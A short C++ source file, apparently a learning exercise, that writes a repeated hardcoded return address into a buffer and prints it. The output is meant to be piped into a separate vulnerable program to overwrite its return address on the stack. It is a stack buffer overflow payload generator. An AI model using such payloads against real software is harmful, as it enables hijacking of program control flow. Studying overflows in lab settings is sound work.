/*
    Author : TYakumo
    2014/11/11    
*/

#include <cstdio>
#include <cstring>

/*
    This is a program aimming at rewriting return address
    If you are x86 (32bit), change (long long*) to (long *)

    Usage Example :
    ./numberOutputer > vulner.out
    ./vulnerProgram < vulner.out
*/

int main()
{

    int i=0; char buf[60];
    memset(buf, 0, sizeof(buf));

    //output string
    const int OUTPUT_BOUND = 32;
    for (i=0;i<=OUTPUT_BOUND;i+=8)
    *(long long *) &buf[i] =  0x0000000000400675LL; //0x000000000040064eLL;//0x00000000000406d7LL;

    for(i = 0; i < OUTPUT_BOUND+8; i++)
        printf("%c", buf[i]); 
        return 0;
}
